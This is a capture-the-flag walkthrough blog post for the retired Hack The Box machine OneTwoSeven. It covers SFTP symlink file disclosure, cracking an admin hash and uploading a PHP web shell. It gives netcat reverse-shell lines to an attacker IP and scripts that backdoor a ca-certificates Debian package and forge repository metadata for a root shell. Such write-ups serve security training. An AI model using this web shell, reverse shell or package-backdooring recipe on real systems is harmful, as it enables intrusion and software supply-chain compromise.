---
layout: post
title: "OneTwoSeven: Hack The Box Walkthrough"
subtitle: "There's no place like 127.0.0.1"
date: 2019-08-31 15:23:36 +0000
last_modified_at: 2019-08-31 15:23:36 +0000
category: Walkthrough
tags: ["Hack The Box", OneTwoSeven, retired]
comments: true
image:
  feature: onetwoseven-htb-walkthrough.jpg
  credit: Alexas_Fotos / Pixabay
  creditlink: https://pixabay.com/photos/frog-farewell-travel-luggage-1033313/
---

This post documents the complete walkthrough of OneTwoSeven, a retired vulnerable [VM][1] created by [jkr][2], and hosted at [Hack The Box][3]. If you are uncomfortable with spoilers, please stop reading now.
{: .notice}

<!--more-->

## On this post 
{:.no_toc} 

* TOC 
{:toc}

## Background

OneTwoSeven is a retired VM from Hack The Box.

## Information Gathering

Let’s start with a `masscan` probe to establish the open ports in the host.

```
# masscan -e tun0 -p1-65535,U:1-65535 10.10.10.133 --rate=500                                                                                     

Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2019-04-25 00:57:53 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning 1 hosts [131070 ports/host]
Discovered open port 80/tcp on 10.10.10.133
Discovered open port 22/tcp on 10.10.10.133
```

Nothing unusual with the ports. Let's do one better with `nmap` scanning the discovered ports to see what services are available.

```
# nmap -n -v -Pn -p22,80 -A --reason -oN nmap.txt 10.10.10.133
...
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey:
|   2048 48:6c:93:34:16:58:05:eb:9a:e5:5b:96:b6:d5:14:aa (RSA)
|   256 32:b7:f3:e2:6d:ac:94:3e:6f:11:d8:05:b9:69:58:45 (ECDSA)
|_  256 35:52:04:dc:32:69:1a:b7:52:76:06:e3:6c:17:1e:ad (ED25519)
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.25 ((Debian))
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Page moved.
```

Wow. This is as good as nothing. Anyways, here's how the site looks like.

<a class="image-popup">
![45319c32.png](/assets/images/posts/onetwoseven-htb-walkthrough/45319c32.png)
</a>

Well, at least we have `index.php`. :smile:

## OneTwoSeven Site

The site has four features: SFTP, static file hosting, IPv6, DDoS Protection.

<a class="image-popup">
![2272d817.png](/assets/images/posts/onetwoseven-htb-walkthrough/2272d817.png)
</a>

<a class="image-popup">
![bb184a09.png](/assets/images/posts/onetwoseven-htb-walkthrough/bb184a09.png)
</a>

<a class="image-popup">
![bc57a7a3.png](/assets/images/posts/onetwoseven-htb-walkthrough/bc57a7a3.png)
</a>

<a class="image-popup">
![fe6edc42.png](/assets/images/posts/onetwoseven-htb-walkthrough/fe6edc42.png)
</a>

Checking the HTML source of `index.php` shows something interesting.

<a class="image-popup">
![59854b9e.png](/assets/images/posts/onetwoseven-htb-walkthrough/59854b9e.png)
</a>

The link to "Admin" is greyed out and it's hosted at `60080/tcp`. It should be clear from the anti-DDoS description, that there's no point in brute-forcing directories or files. Other pages include `signup.php`, `stats.php`, and `attribution.php`.

## Secure File Transfer Protocol

Let's grab an account first above all else.

<a class="image-popup">
![58357d05.png](/assets/images/posts/onetwoseven-htb-walkthrough/58357d05.png)
</a>

Pretty retro with the static homepage hosting. Oops. I'm not that old. :wink:

<a class="image-popup">
![01432007.png](/assets/images/posts/onetwoseven-htb-walkthrough/01432007.png)
</a>

Time to log in to our SFTP account.

<a class="image-popup">
![9a360798.png](/assets/images/posts/onetwoseven-htb-walkthrough/9a360798.png)
</a>

This is really old school man. It reminds me of the personal home page hosting I got from my ISP twenty-years ago. I missed the sound of the modem dialing...

<a class="image-popup">
![aad133da.png](/assets/images/posts/onetwoseven-htb-walkthrough/aad133da.png)
</a>

I literally hit a brick wall with `index.html`. Nonetheless, I can remove the brick wall to reveal directory index.

<a class="image-popup">
![0277e9c2.png](/assets/images/posts/onetwoseven-htb-walkthrough/0277e9c2.png)
</a>

There you go. What's next? We can create symlinks to see if we are lucky enough to view certain files.

```
sftp> ln -s /etc/passwd passwd
```

<a class="image-popup">
![bb5b8b73.png](/assets/images/posts/onetwoseven-htb-walkthrough/bb5b8b73.png)
</a>

What do we have here?

<a class="image-popup">
![99b20eae.png](/assets/images/posts/onetwoseven-htb-walkthrough/99b20eae.png)
</a>

Notice the first entry is different from the rest? Can we look at other files and directories too?

```
sftp> ln -s /var/www/html/index.php index.txt
```

<a class="image-popup">
![c29f6ad6.png](/assets/images/posts/onetwoseven-htb-walkthrough/c29f6ad6.png)
</a>

Yes we can!

<a class="image-popup">
![10c0f31c.png](/assets/images/posts/onetwoseven-htb-walkthrough/10c0f31c.png)
</a>

Long story short, I went ahead to symlink `signup.phhp`, `stats.php`, and the `root` directory.

<a class="image-popup">
![c983d96a.png](/assets/images/posts/onetwoseven-htb-walkthrough/c983d96a.png)
</a>

<a class="image-popup">
![84349ec1.png](/assets/images/posts/onetwoseven-htb-walkthrough/84349ec1.png)
</a>

_`signup.php`_

<a class="image-popup">
![9d39efaf.png](/assets/images/posts/onetwoseven-htb-walkthrough/9d39efaf.png)
</a>

_`stats.php`_

<a class="image-popup">
![27ee381f.png](/assets/images/posts/onetwoseven-htb-walkthrough/27ee381f.png)
</a>

_`root` directory_

<a class="image-popup">
![773ac36f.png](/assets/images/posts/onetwoseven-htb-walkthrough/773ac36f.png)
</a>

Now that we know how the password is generated, we can simply SFTP ourself to other accounts to satisfy our curiosity. First up, `ots-yODc2NGQ` because it's coming from the loopback interface.

```
# echo -n 127.0.0.1 | md5sum | cut -c-8
f528764d
```

<a class="image-popup">
![aa9e6e70.png](/assets/images/posts/onetwoseven-htb-walkthrough/aa9e6e70.png)
</a>

What a surprise, `user.txt` is here.

<a class="image-popup">
![d5610a6e.png](/assets/images/posts/onetwoseven-htb-walkthrough/d5610a6e.png)
</a>

## Administration Backend

Recall the link to Admin was on `60080/tcp`? We can make use of ProxyCommand to run `ssh` and forward a local port on our attacking machine to the remote port of `60080/tcp` like so.

<a class="image-popup">
![8a9e17f6.png](/assets/images/posts/onetwoseven-htb-walkthrough/8a9e17f6.png)
</a>

Ignore the "Connection closed" message and check out the ports listening on our attacking machine.

<a class="image-popup">
![de7d28ad.png](/assets/images/posts/onetwoseven-htb-walkthrough/de7d28ad.png)
</a>

Time to check out if we can access the administration backend.

<a class="image-popup">
![d78c9958.png](/assets/images/posts/onetwoseven-htb-walkthrough/d78c9958.png)
</a>

Voila! Only to be stonewalled by a login form. :angry:

<a class="image-popup">
![a3814d42.png](/assets/images/posts/onetwoseven-htb-walkthrough/a3814d42.png)
</a>

Fret not. We have the Vim swap file of `/var/www/html-admin/login.php`. Maybe that will tell us the username and password?

```
# vim -r login.php.swp
```

<a class="image-popup">
![43e3840c.png](/assets/images/posts/onetwoseven-htb-walkthrough/43e3840c.png)
</a>

<a class="image-popup">
![3f99c614.png](/assets/images/posts/onetwoseven-htb-walkthrough/3f99c614.png)
</a>

Awesome. Let's send the hash to JtR for cracking.

<a class="image-popup">
![fe1a61bc.png](/assets/images/posts/onetwoseven-htb-walkthrough/fe1a61bc.png)
</a>

It's login time!

<a class="image-popup">
![040781de.png](/assets/images/posts/onetwoseven-htb-walkthrough/040781de.png)
</a>

Looks like I'm not the only one here. :laughing: How do you separate the wheat from the chaff? I've applied a light-touch brute-forcing prior to this and found the directory index of `/addons`. Check out the timestamps of the default "plugins" surrounded by the red box.

<a class="image-popup">
![da5d93d8.png](/assets/images/posts/onetwoseven-htb-walkthrough/da5d93d8.png)
</a>

Well, it appears that we can upload "plugins" as well. The "disabled" button is immaterial.

<a class="image-popup">
![ce02fa6c.png](/assets/images/posts/onetwoseven-htb-walkthrough/ce02fa6c.png)
</a>

Not only that, we can download the "plugins" too!

<a class="image-popup">
![17395127.png](/assets/images/posts/onetwoseven-htb-walkthrough/17395127.png)
</a>

I downloaded all the default "plugins", and something funky is going on with them, especially `ots-man-addon.php`:

1. You can't execute PHP straight from the `/addons` directory
2. Execution must go through `menu.php?addon=...`
3. You can't upload because `addon-upload.php` is not available
4. Fret not, `addon-download.php` is...


Check out `ots-man-addon.php`.

<div class="filename"><span>ots-man-addon.php</span></div>

```php
<?php session_start(); if (!isset ($_SESSION['username'])) { header("Location: /login.php"); }; if ( strpos($_SERVER['REQUEST_URI'], '/addons/') !== false ) { die(); };
# OneTwoSeven Admin Plugin
# OTS Addon Manager
switch (true) {
  # Upload addon to addons folder.
  case preg_match('/\/addon-upload.php/',$_SERVER['REQUEST_URI']):
    if(isset($_FILES['addon'])){
      $errors= array();
      $file_name = basename($_FILES['addon']['name']);
      $file_size =$_FILES['addon']['size'];
      $file_tmp =$_FILES['addon']['tmp_name'];

      if($file_size > 20000){
        $errors[]='Module too big for addon manager. Please upload manually.';
      }

      if(empty($errors)==true) {
        move_uploaded_file($file_tmp,$file_name);
        header("Location: /menu.php");
        header("Content-Type: text/plain");
        echo "File uploaded successfull.y";
      } else {
        header("Location: /menu.php");
        header("Content-Type: text/plain");
        echo "Error uploading the file: ";
        print_r($errors);
      }
    }
    break;
  # Download addon from addons folder.
  case preg_match('/\/addon-download.php/',$_SERVER['REQUEST_URI']):
    if ($_GET['addon']) {
      $addon_file = basename($_GET['addon']);
      if ( file_exists($addon_file) ) {
        header("Content-Disposition: attachment; filename=$addon_file");
        header("Content-Type: text/plain");
        readfile($addon_file);
      } else {
        header($_SERVER["SERVER_PROTOCOL"]." 404 Not Found", true, 404);
        die();
      }
    }
    break;
  default:
    echo "The addon manager must not be executed directly but only via<br>";
    echo "the provided RewriteRules:<br><hr>";
    echo "RewriteEngine On<br>";
    echo "RewriteRule ^addon-upload.php   addons/ots-man-addon.php [L]<br>";
    echo "RewriteRule ^addon-download.php addons/ots-man-addon.php [L]<br><hr>";
    echo "By commenting individual RewriteRules you can disable single<br>";
    echo "features (i.e. for security reasons)<br><br>";
    echo "<font size='-2'>Please note: Disabling a feature through htaccess leads to 404 errors for now.</font>";
    break;
}
?>
```

If we append `/addon-up.php` to `/addon-download.php`, and because `/addon-download.php` gets rewritten to `ots-man-addon.php`, the first case will match and our "plugin" gets uploaded.

One last thing: the 2nd line of the uploaded PHP must be `# OneTwoSeven Admin Plugin`. Here's the file that I'll be uploading.

<div class="filename"><span>ots-endgame.php</span></div>

```
<?php session_start(); if (!isset ($_SESSION['username'])) { header("Location: /login.php"); }; if ( strpos($_SERVER['REQUEST_URI'], '/addons/') !== false ) { die(); };
# OneTwoSeven Admin Plugin
# OTS Default User
echo shell_exec($_GET[0]);
?>
```

Time to upload.

```
# curl -i -b "PHPSESSID=emhvsbp1urdd9cbabfhkcv20s0" -F "addon=@ots-endgame.php" "http://onetwoseven.htb:60080/addon-download.php/addon-upload.php"
HTTP/1.1 302 Found
Date: Sat, 27 Apr 2019 12:51:59 GMT
Server: Apache/2.4.25 (Debian)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Location: /menu.php
Content-Length: 27
Content-Type: text/plain;charset=UTF-8

File uploaded successfull.y
```

<a class="image-popup">
![67d22bc7.png](/assets/images/posts/onetwoseven-htb-walkthrough/67d22bc7.png)
</a>

Sweet.

## Low-Privilege Shell

With remote command execution, we can get ourselves a low-privilege shell with `nc`.

```
http://onetwoseven.htb:60080/menu.php?addon=ots-endgame.php&0=nc 10.10.12.49 1234 -e /bin/bash
```

<a class="image-popup">
![aec0f561.png](/assets/images/posts/onetwoseven-htb-walkthrough/aec0f561.png)
</a>

Let's [upgrade](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/) the shell to a full TTY.

<a class="image-popup">
![883cd4ed.png](/assets/images/posts/onetwoseven-htb-walkthrough/883cd4ed.png)
</a>

## Privilege Escalation

During enumeration of `www-admin-data`'s account, I noticed that `www-admin-data` is able to `sudo` `apt-get update`, `apt-get upgrade`, and preserve certain environment variables.

<a class="image-popup">
![2097c992.png](/assets/images/posts/onetwoseven-htb-walkthrough/2097c992.png)
</a>

And if you check `/etc/apt/source.list.d/onetwoseven.list` then the road to `root` is imminent.

<a class="image-popup">
![7ee640f6.png](/assets/images/posts/onetwoseven-htb-walkthrough/7ee640f6.png)
</a>

Here's the game plan:

1. Map `packages.onetwoseven.htb` to `127.0.0.1` in `/etc/hosts`
2. Set up a HTTP proxy server on my attacking machine. Burp will do fine, just change the interface to `tun0`.
3. Set up a fake repository with a package release having a higher version number and a backdoored DEB package.
4. Run `sudo http_proxy=http://10.10.12.49:8080 apt-get update`
5. Run `sudo http_proxy=http://10.10.12.49:8080 apt-get upgrade`
6. Claim the prize.

I guess the question is how do you go about doing Step 3. How's how.

...

First of all, select a package that you want to backdoor. I've selected `ca-certificates`. It's relatively small in size and there's a `config` script executed as `root`.

Next, set up the directory structure on my attacking machine.

```
# mkdir -p devuan/dists/ascii/main/binary-amd64
# mkdir -p devuan/pool/main/c/ca-certificates
```

And since I'm using Kali Linux, I'll download the latest `ca-certificates` from the Kali Linux repository.

<a class="image-popup">
![f2478a05.png](/assets/images/posts/onetwoseven-htb-walkthrough/f2478a05.png)
</a>

Run the following commands in the same directory:

```
# wget http://kali.download/kali/pool/main/c/ca-certificates/ca-certificates_20190110_all.deb
# dpkg-deb -R ca-certificates_20190110_all.deb evil
# rm ca-certificates_20190110_all.deb
# sed -i '2i \/bin/nc 10.10.12.49 4321 -e /bin/bash' evil/DEBIAN/config
# dpkg-deb -b evil ca-certificates_20190110_all.deb
# cp ca-certificates_20190110_all.deb /root/Downloads/onetwoseven/backdoor/devuan/pool/main/c/ca-certificates
```

Prepare the Package metadata with the following script.

<div class="filename"><span>prepare</span></div>

```bash
#!/bin/bash

DEB=$(pwd)/devuan/pool/main/c/ca-certificates/*.deb
PACKAGE=$(pwd)/devuan/dists/ascii/main/binary-amd64

# Package
apt-cache show ca-certificates > "$PACKAGE"/Packages

# Downgrade dependency
sed -r -i "s/1.1.1/1.0.0/" "$PACKAGE"/Packages

# Size
sed -r -i "s/^(Size: )(.*)$/\1$(ls -la $DEB | cut -d' ' -f5)/" "$PACKAGE"/Packages

# SHA256
sed -r -i "s/^(SHA256: )(.*)$/\1$(sha256sum $DEB | cut -d' ' -f1)/" "$PACKAGE"/Packages

# SHA1
sed -r -i "s/^(SHA1: )(.*)$/\1$(sha1sum $DEB | cut -d' ' -f1)/" "$PACKAGE"/Packages

# MD5Sum
sed -r -i "s/^(MD5sum: )(.*)$/\1$(md5sum $DEB | cut -d' ' -f1)/" "$PACKAGE"/Packages

# Priority
sed -r -i "s/^(Priority: )(.*)$/\1required/" "$PACKAGE"/Packages

# Package.gz
gzip < "$PACKAGE"/Packages > "$PACKAGE"/Packages.gz
```

Prepare the Package Release metadata with the following script.

<div class="filename"><span>pack</span></div>

```bash
#!/bin/bash

PACKAGE=$(pwd)/devuan/dists/ascii/main/binary-amd64
RELEASE=$(pwd)/devuan/dists/ascii/Release
where=main/binary-amd64

cd $PACKAGE

cat << EOF > $RELEASE
Origin: Devuan
Label: ascii
Suite: ascii
Version: 2.0.0
Codename: ascii
Date: Sun, 28 Apr 2019 01:27:05 UTC
Valid-Until: Sun, 05 May 2019 01:27:05 UTC
Architectures: amd64
Components: main
EOF

# MD5Sum
echo "MD5Sum:" >> $RELEASE
for p in Packages*; do
  md5=$(md5sum $p | cut -d' ' -f1)
  size=$(ls -la $p | cut -d' ' -f5)
  printf " %32s%7d %s\n" "$md5" "$size" "$where/$p" >> $RELEASE
done

# SHA1
echo "SHA1:" >> $RELEASE
for p in Packages*; do
  sha1=$(sha1sum $p | cut -d' ' -f1)
  size=$(ls -la $p | cut -d' ' -f5)
  printf " %32s%7d %s\n" "$sha1" "$size" "$where/$p" >> $RELEASE
done

# SHA256
echo "SHA256:" >> $RELEASE
for p in Packages*; do
  sha256=$(sha256sum $p | cut -d' ' -f1)
  size=$(ls -la $p | cut -d' ' -f5)
  printf " %32s%7d %s\n" "$sha256" "$size" "$where/$p" >> $RELEASE
done

cd - &>/dev/null
```

Once that's done, we can launch our attack.

<a class="image-popup">
![56d5b622.png](/assets/images/posts/onetwoseven-htb-walkthrough/56d5b622.png)
</a>

Install the "evil" package.

<a class="image-popup">
![3d7ac752.png](/assets/images/posts/onetwoseven-htb-walkthrough/3d7ac752.png)
</a>

Meanwhile, at our `nc` listener, a `root` shell appears...

<a class="image-popup">
![1e71c2ab.png](/assets/images/posts/onetwoseven-htb-walkthrough/1e71c2ab.png)
</a>

Getting `root.txt` is trivial when you have a `root` shell.

<a class="image-popup">
![207b2a6a.png](/assets/images/posts/onetwoseven-htb-walkthrough/207b2a6a.png)
</a>

:dancer:

[1]: https://www.hackthebox.eu/home/machines/profile/185
[2]: https://www.hackthebox.eu/home/users/profile/77141
[3]: https://www.hackthebox.eu/
